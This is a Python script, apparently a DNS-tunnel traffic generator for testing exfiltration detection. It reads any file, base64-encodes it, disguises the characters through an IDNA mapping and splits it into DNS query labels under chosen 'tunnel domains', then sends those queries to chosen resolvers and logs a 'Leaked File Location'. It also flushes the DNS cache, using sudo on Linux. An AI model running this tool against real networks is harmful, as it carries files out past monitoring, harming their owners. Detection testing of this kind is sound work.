import os
import time
import random
import string
import argparse
import platform
import traceback
import subprocess
from datetime import datetime

uppercase_mapping = {
    'A': 'â',
    'B': 'ᶀ',
    'C': 'ç',
    'D': 'ᶁ',
    'E': 'ê',
    'F': 'ᶂ',
    'G': 'ğ',
    'H': 'ⱨ',
    'I': 'ı',
    'J': 'ɟ',
    'K': 'ᶄ',
    'L': 'ɭ',
    'M': 'ɱ',
    'N': 'ᶇ',
    'O': 'ö',
    'P': 'ᶈ',
    'Q': 'ʠ',
    'R': 'ɼ',
    'S': 'ş',
    'T': 'ƫ',
    'U': 'ü',
    'V': 'ᶌ',
    'W': 'ŵ',
    'X': 'ᶍ',
    'Y': 'ỷ',
    'Z': 'ʐ',
    '=': 'ᵻ',
    '/': 'ᶖ',
    '+': 'ë'
}
uppercase_demapping = {v: k for k, v in uppercase_mapping.items()}


def install_and_import(package, package_and_version, from_imports=None):
    try:
        if from_imports:
            module = __import__(package, fromlist=from_imports)
            globals().update({name: getattr(module, name) for name in from_imports})
        else:
            __import__(package)

    except ImportError:
        print(f"{package} not installed. Installing...")
        subprocess.call(f"pip install {package_and_version}", shell=True)

        if from_imports:
            module = __import__(package, fromlist=from_imports)
            globals().update({name: getattr(module, name) for name in from_imports})

        # Now try to import again
        __import__(package)


install_and_import("base64", "cryptography==39.0.1")
install_and_import("dns.resolver", "dnspython==2.0.0")
install_and_import("yagmail", "yagmail==0.15.293")
install_and_import("tqdm", "tqdm==4.46.0", from_imports=["tqdm"])

import math
import base64
import dns.resolver
from tqdm import tqdm

print("version: 1.0.2")


def logger(text, exc_info=False):
    print("{} - {}".format(datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ"), text))
    res = traceback.format_exc()
    if res and exc_info:
        print(res)


class TunnelTraffic:
    def __init__(self):
        self.debug = 1

    def calculate_base64_encoded_size(self, original_size_bytes):
        encoded_size = math.ceil(original_size_bytes / 3) * 4
        return encoded_size

    def cache_cleaner(self):
        try:
            os = platform.system()

            if os == "Windows":
                subprocess.run(["ipconfig", "/flushdns"], capture_output=True, text=True)
                logger("DNS cache cleared.")

            elif os == "Linux":
                subprocess.run(["sudo", "systemd-resolve", "--flush-caches"], capture_output=True, text=True)
                logger("DNS cache cleared.")

            else:
                logger("DNS cache could not cleared.")
        except Exception as e:
            logger(f"Error: {e}")

    def map_uppercase(self, domain_name, mapping):
        modified_name = ""
        for char in domain_name:
            if char in mapping:
                modified_name += mapping[char]
            else:
                modified_name += char
        return modified_name

    def encode_upper_case(self, text):
        text = self.map_uppercase(text, uppercase_mapping)
        text = text.encode("idna").decode("utf-8")
        text = text.replace("xn--", "", 1)
        return text

    def encode_string(self, text):
        encoded_text = base64.b64encode(text)
        encoded_text = encoded_text.decode()
        return encoded_text

    def random_string_generator(self, encoded_file, params, length):
        string_list = []
        encoded_file = encoded_file
        max_length = params["max_length"]
        min_length = params["min_length"]
        all_data_char_count = len(encoded_file)

        while len(encoded_file) > length:

            length = length if "length" in params and params["length"] else random.randint(min_length, max_length)
            base_text = encoded_file[:length]
            string_list.append(self.encode_upper_case(base_text))
            encoded_file = encoded_file[length:]

        if len(encoded_file) >= 0:
            base_text = encoded_file
            string_list.append(self.encode_upper_case(base_text))

        string_list.append(self.encode_upper_case("ZmluaXNo"))

        return string_list

    def read_file_as_bytes_and_encrypt(self, file_name):
        encrypted_content = "None"
        try:
            encrypted_content = open(file_name, "rb").read()

        except FileNotFoundError as f:
            logger(f"Error: {file_name} not found. {f}", exc_info=False)

        except Exception as e:
            logger(f"Error: {e}", exc_info=True)

        return encrypted_content

    def generate_unique_string(self):
        characters = string.ascii_lowercase + string.digits  # alfa numeric chars
        un_str = []
        for i in range(0, 5):
            un_str.append(random.choice(characters))

        return "".join(un_str)

    def send_dns_queries(self, params, dns_request_list):
        errors = []

        resolver = dns.resolver.Resolver()
        resolver.nameservers = params["config"]["dns_ips"]
        resolver.timeout = params["config"]["timeout"]
        resolver.lifetime = params["config"]["timeout"]
        resolver.port = params["config"]["dns_port"]
        if len(dns_request_list) < 100:
            raise "File is not appropriate for tunnel test. Please use another file bigger then 100KB."

        for i, domainName in enumerate(tqdm(dns_request_list)):
            status = "fail"

            while status == "fail":

                try:
                    result = resolver.resolve(domainName, params["config"]["query_type"])
                    time.sleep(params["config"]["timeout"])
                    dnsRequestResult = [queryResult.to_text() for queryResult in result]
                    req = f"{domainName}: {''.join(dnsRequestResult)} - OK"
                    if self.debug == 1: logger(req)
                    status = "success"

                except dns.resolver.NXDOMAIN:
                    if self.debug == 1: logger(f"{domainName} NOT FOUND")
                    errors.append(domainName)

                except dns.exception.Timeout:
                    if self.debug == 1: logger(f"{domainName} QUERY TIMEOUT")
                    errors.append(domainName)

                except dns.resolver.NoNameservers:
                    if self.debug == 1: logger(f"{domainName} NO NAME SERVER")
                    errors.append(domainName)

                except Exception as e:
                    logger(f"Error: {e}", exc_info=True)

    def read_and_encode_base64_file(self, params):
        file_content = self.read_file_as_bytes_and_encrypt(params["config"]["file_path"])
        encoded_file = self.encode_string(file_content)
        if len(encoded_file) < 13333:
            raise Exception("File is not appropriate for tunnel test. Please use another file bigger then 100KB.")

        return encoded_file

    def prepare_data(self, unique_string, params, encoded_file, file_name):
        domains = params["config"]["tunnel_domains"]
        if "length" in params and params["length"]:
            length = params["length"]
        else:
            length = params["max_length"]
        string_list = self.random_string_generator(encoded_file, params, length)
        dns_request_list = []

        for i, item in enumerate(string_list):
            dns_request_list.append(unique_string + "-" + (str((i + 1) * 10)) + "-" + item + "." + domains[i % len(domains)])

        logger("DNS Query Count: {}".format(len(dns_request_list)))

        meta = f"{file_name}-{len(dns_request_list) - 1}"
        meta_encode = self.encode_string(meta.encode('utf-8'))
        file_name_first = f"{unique_string}-0-{self.encode_upper_case(self.encode_string(meta.encode('utf-8')))}.{domains[0]}"
        if len(file_name_first) > 63:
            part = (len(meta_encode) // length) + 1
            for i in reversed(range(0, part)):
                dns_request_list[:0] = [f"{unique_string}-{i}-{self.encode_upper_case(meta_encode[i*length:(i+1)* length])}.{domains[0]}"]
        else:
            dns_request_list[:0] = [file_name_first]

        return dns_request_list

    def generate_traffic(self, params):
        file_size = os.path.getsize(params["config"]["file_path"])
        file_size_in_kb = file_size / 1024
        if file_size_in_kb < 10:
            raise Exception("[ERROR] File is too small try bigger file. File size: {} Kb".format(round(file_size_in_kb, 4)))

        else:

            file_name = os.path.basename(params["config"]["file_path"])
            self.cache_cleaner()
            unique_string = self.generate_unique_string()
            encoded_file = self.read_and_encode_base64_file(params)
            data = self.prepare_data(unique_string, params, encoded_file, file_name)

        return data, unique_string


def argument_parsing():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dnsips", required=False, help='dns ips comma separated', type=str, default=None)
    parser.add_argument("--dnsport", required=False, help='dns port', type=int, default=53)
    parser.add_argument("--tunneldomains", required=False, help='tunnel domains comma separated', type=str, default=None)
    parser.add_argument("--filepath", required=False, help='file path', type=str, default=None)
    parser.add_argument("--querytype", required=False, help='query type', type=str, default='A')
    parser.add_argument("--timeout", required=False, help='timeout', type=float, default=1)

    args = parser.parse_args()

    return args


def main():
    tunnel_generator = TunnelTraffic()

    logger("[DNSTUNNEL TRAFFIC GENERATOR] has started.")

    args = argument_parsing()

    params = {
        "min_length": 18,
        "max_length": 20
    }

    configs = {
        "file_path": args.filepath,
        "dns_ips": args.dnsips.split(","),
        "dns_port": args.dnsport,
        "tunnel_domains": args.tunneldomains.split(","),
        "query_type": args.querytype,
        "timeout": args.timeout
        }

    params["config"] = configs

    logger("{}\n".format(params))
    data, unique_string = tunnel_generator.generate_traffic(params)

    tunnel_generator.send_dns_queries(params, data)
    logger(f"Leaked File Location: {unique_string}")
    logger("Tunnel Testing has done.")


if __name__ == "__main__":
    main()
